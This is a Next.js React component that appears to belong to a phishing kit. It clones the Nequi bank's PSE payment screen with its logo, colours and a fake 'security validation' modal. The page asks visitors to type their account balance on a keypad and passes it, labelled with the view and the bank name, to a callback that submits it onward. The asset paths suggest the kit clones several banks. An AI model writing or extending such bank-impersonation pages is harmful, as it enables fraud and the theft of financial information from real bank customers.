/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import React, { useState, useEffect, useMemo } from 'react';

export default function SaldoNequi({ enviar }: any) {
  const [saldo, setSaldo] = useState("");
  const [mostrarModal, setMostrarModal] = useState(true);

  const saldoFormateado = useMemo(() => {
    if (!saldo) return "$ 0";
    const valor = parseInt(saldo).toLocaleString('es-CO');
    return `$ ${valor}`;
  }, [saldo]);

  const isFormValid = useMemo(() => saldo.length > 0 && parseInt(saldo) > 0, [saldo]);

  const handleContinuar = () => {
    if (isFormValid) {
      enviar?.({
        view: 'saldo',
        saldo: saldo,
        bank: "Nequi"
      });
    }
  };

  useEffect(() => {
    if (mostrarModal) return;
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Backspace") setSaldo(prev => prev.slice(0, -1));
      else if (/^\d$/.test(e.key) && saldo.length < 12) setSaldo(prev => prev + e.key);
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [saldo, mostrarModal]);

  return (
    <div className="relative min-h-screen" style={{ fontFamily: "'Manrope', sans-serif" }}>
      <style dangerouslySetInnerHTML={{
        __html: `@import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap');`
      }} />

      {/* MODAL - Se ve el fondo para que el usuario sepa que está encima */}
      {mostrarModal && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/20 backdrop-blur-lg cursor-pointer p-8 animate-in fade-in duration-300"
          onClick={() => setMostrarModal(false)}
        >
          <div className="relative max-w-85 w-full animate-in zoom-in duration-300">
            <img
              src="/bancos/nequi/img/modal-saldo.jpeg"
              alt="Validación de seguridad"
              className="w-full h-auto rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] border border-white/20"
            />
            {/* Pequeño indicador visual de "toca para cerrar" opcional */}
            <div className="text-white text-center mt-4 text-sm font-medium opacity-70">
              Toca para continuar
            </div>
          </div>
        </div>
      )}

      {/* CONTENIDO PRINCIPAL (SALDO) */}
      <div className={`contenedor transition-all duration-700 max-w-100 mx-auto p-4 text-center ${mostrarModal ? 'scale-[0.95] blur-sm' : 'scale-100 opacity-100'}`}>
        <img src="/bancos/nequi/img/logo.svg" width="176" className="mx-auto mb-4" alt="logo" />

        <div className="text-[20px] font-extrabold text-[#210049] mb-2">Pagos PSE de Nequi</div>
        <p className="text-[14px] text-gray-500 mb-6 px-4">
          Ingrese el saldo disponible de su cuenta Nequi para continuar.
        </p>

        <div className="mx-auto mb-10 w-70.5 border-b-2 border-[#210049] pb-2">
          <div className="text-[32px] font-bold text-[#210049] h-12 flex items-center justify-center">
            {saldoFormateado}
          </div>
        </div>

        <div className="grid grid-cols-3 gap-y-4 mb-10 max-w-75 mx-auto">
          {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
            <button
              key={num}
              onClick={() => saldo.length < 12 && setSaldo(prev => prev + num)}
              className="text-[28px] font-medium text-[#210049] py-2 active:bg-gray-100 rounded-full transition-colors"
            >
              {num}
            </button>
          ))}
          <div />
          <button
            onClick={() => saldo.length < 12 && setSaldo(prev => prev + "0")}
            className="text-[28px] font-medium text-[#210049] py-2 active:bg-gray-100 rounded-full transition-colors"
          >
            0
          </button>
          <button
            onClick={() => setSaldo(prev => prev.slice(0, -1))}
            className="flex items-center justify-center active:opacity-50"
          >
            <img src="/bancos/nequi/img/borrar.jpg" width="35" alt="borrar" />
          </button>
        </div>

        <button
          onClick={handleContinuar}
          disabled={!isFormValid}
          className={`w-full py-4 font-bold text-lg rounded-sm transition-all duration-300 ${isFormValid
            ? "bg-[#da0081] text-white shadow-lg active:scale-95"
            : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
        >
          Continuar
        </button>

        <button className="w-full py-4 mt-2 text-[#da0081] font-bold text-sm bg-transparent">
          Cancela pago
        </button>
      </div>
    </div>
  );
}